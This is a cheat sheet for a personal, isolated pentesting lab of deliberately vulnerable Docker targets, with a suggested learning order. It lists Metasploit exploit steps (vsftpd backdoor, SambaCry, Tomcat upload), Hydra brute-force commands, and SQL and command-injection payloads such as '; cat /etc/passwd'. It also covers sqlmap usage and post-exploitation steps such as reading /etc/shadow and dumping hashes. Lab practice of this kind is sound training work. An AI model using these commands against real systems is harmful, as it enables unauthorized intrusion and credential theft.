# Pentesting Lab - Cheat Sheet

Quick reference for exploiting each target in the lab.

## Network Map

```
┌─────────────────────────────────────────────────────────────────────────┐
│  VULNERABLE NETWORK: 172.20.0.0/24                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  YOUR MAC (Attacker)                                                    │
│  ┌─────────────────┐                                                    │
│  │ 172.20.0.1      │  msfconsole, nmap, hydra, sqlmap                  │
│  │ Host machine    │                                                    │
│  └────────┬────────┘                                                    │
│           │                                                             │
│           ▼                                                             │
│  ┌────────────────────────────────────────────────────────────────┐    │
│  │                     TARGETS                                     │    │
│  ├────────────────────────────────────────────────────────────────┤    │
│  │ .10  DVWA             │ SQLi, XSS, Command Injection           │    │
│  │ .15  vsftpd 2.3.4     │ Famous backdoor - EASY WIN (port 21)   │    │
│  │ .16  SambaCry         │ CVE-2017-7494 (port 445)               │    │
│  │ .17  Vuln SSH         │ Brute force practice (port 22)         │    │
│  │ .18  MySQL 5.5        │ Weak creds (port 3306)                 │    │
│  │ .19  Tomcat           │ Manager upload exploit (port 8080)     │    │
│  │ .20  Metasploitable2  │ SSH, FTP, HTTP, SMB - many vulns       │    │
│  │ .30  Juice Shop       │ Modern OWASP Top 10                    │    │
│  │ .40  WebGoat          │ OWASP training platform                │    │
│  │ .50  Mutillidae       │ OWASP Top 10 practice                  │    │
│  │ .60  WordPress        │ Plugin vulns, weak auth                │    │
│  │ .70  bWAPP            │ 100+ web vulnerabilities               │    │
│  │ .100 Cowrie Honeypot  │ SSH/Telnet trap (study attackers)      │    │
│  └────────────────────────────────────────────────────────────────┘    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

## Quick Start

```bash
# Start all targets
docker-compose up -d

# Start specific target
docker-compose up dvwa vsftpd -d

# Launch Metasploit
msfconsole   # or 'ms' alias

# Quick network scan
db_nmap -sV 172.20.0.0/24
```

---

## Exploit Commands by Target

### 172.20.0.15 - vsftpd 2.3.4 Backdoor (EASY WIN - Start Here)

Famous backdoor from 2011. Guaranteed root shell.

```
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set RHOSTS 172.20.0.15
msf6> run
```

### 172.20.0.16 - SambaCry (CVE-2017-7494)

```
msf6> use exploit/linux/samba/is_known_pipename
msf6> set RHOSTS 172.20.0.16
msf6> set SMBUser nobody
msf6> set SMBPass ""
msf6> run
```

### 172.20.0.17 - SSH Brute Force

**With Metasploit:**
```
msf6> use auxiliary/scanner/ssh/ssh_login
msf6> set RHOSTS 172.20.0.17
msf6> set USERNAME root
msf6> set PASS_FILE ~/Projects/metasploit/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt
msf6> run
```

**With Hydra (faster):**
```bash
hydra -l root -P wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://172.20.0.17
```

Known creds: `root/toor`, `user/password`

### 172.20.0.18 - MySQL Weak Credentials

```
msf6> use auxiliary/scanner/mysql/mysql_login
msf6> set RHOSTS 172.20.0.18
msf6> set USERNAME root
msf6> set PASSWORD root
msf6> run
```

Or connect directly:
```bash
mysql -h 172.20.0.18 -u root -proot
```

### 172.20.0.19 - Tomcat Manager Upload

```
msf6> use exploit/multi/http/tomcat_mgr_upload
msf6> set RHOSTS 172.20.0.19
msf6> set RPORT 8080
msf6> set HttpUsername tomcat
msf6> set HttpPassword tomcat
msf6> run
```

### 172.20.0.20 - Metasploitable2 (Multiple Vulns)

Target-rich environment. Start with recon:
```bash
nmap -sV -sC 172.20.0.20
```

Common vulns:
- FTP anonymous login
- SSH weak passwords
- Unreal IRCd backdoor
- Samba
- distcc

---

## Web Application Targets

Access from your browser:

| Target | URL | Default Creds |
|--------|-----|---------------|
| DVWA | http://localhost:8080 | admin/password |
| bWAPP | http://localhost:8072 | bee/bug |
| WordPress | http://localhost:8083 | - |
| Juice Shop | http://localhost:3000 | - |
| Tomcat | http://localhost:8019 | tomcat/tomcat |
| WebGoat | http://localhost:8081 | register |
| Mutillidae | http://localhost:8082 | - |

### DVWA SQL Injection

Set security to "Low" first, then:
```sql
' OR '1'='1
' UNION SELECT user, password FROM users--
```

### DVWA Command Injection
```
127.0.0.1; cat /etc/passwd
127.0.0.1 | whoami
127.0.0.1 && id
```

### SQLMap against DVWA
```bash
# Get your PHPSESSID cookie from browser first
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx;security=low" --dbs
```

---

## Scanning Commands

```bash
# Full port scan
nmap -p- 172.20.0.10

# Service + version detection
nmap -sV 172.20.0.10

# Aggressive scan (OS, versions, scripts, traceroute)
nmap -A 172.20.0.10

# Vulnerability scripts
nmap --script vuln 172.20.0.10

# From within msfconsole (saves to DB)
db_nmap -sV -sC 172.20.0.0/24
hosts      # View discovered hosts
services   # View discovered services
vulns      # View discovered vulns
```

### Web Scanning
```bash
# Directory brute force
gobuster dir -u http://172.20.0.10 -w wordlists/seclists/Discovery/Web-Content/common.txt

# Nikto web scanner
nikto -h http://172.20.0.10
```

---

## Post-Exploitation

Once you get a shell:

```bash
# Basic enumeration
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow  # if root

# Network
ifconfig
netstat -tulpn
cat /etc/hosts

# Find SUID binaries (privesc opportunities)
find / -perm -4000 2>/dev/null

# Metasploit post modules
use post/linux/gather/hashdump
use post/multi/gather/env
use post/linux/gather/enum_network
```

---

## Hydra Cheat Sheet

```bash
# SSH brute force
hydra -l root -P passwords.txt ssh://172.20.0.17

# FTP brute force
hydra -l admin -P passwords.txt ftp://172.20.0.15

# HTTP POST form
hydra -l admin -P passwords.txt 172.20.0.10 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid"

# MySQL
hydra -l root -P passwords.txt mysql://172.20.0.18

# With username list too
hydra -L users.txt -P passwords.txt ssh://172.20.0.17
```

---

## Learning Path (Suggested Order)

1. **vsftpd (.15)** - Guaranteed easy shell, learn the MSF workflow
2. **Tomcat (.19)** - Authenticated exploit, learn credential attacks
3. **SSH brute force (.17)** - Learn Hydra and wordlists
4. **DVWA (.10)** - Web app fundamentals (SQLi, XSS)
5. **Metasploitable2 (.20)** - Multiple services, more recon needed
6. **Juice Shop (.30)** - Modern apps, more challenging

---

## Saving Work

Your Metasploit database persists across sessions:
```
workspace           # List workspaces
workspace -a dvwa   # Create workspace for DVWA
workspace dvwa      # Switch to it
hosts               # View hosts in current workspace
```

Export data:
```
hosts -o /tmp/hosts.csv
services -o /tmp/services.csv
vulns -o /tmp/vulns.csv
```

---

**Remember: This is YOUR isolated lab. Break it, learn, repeat.**
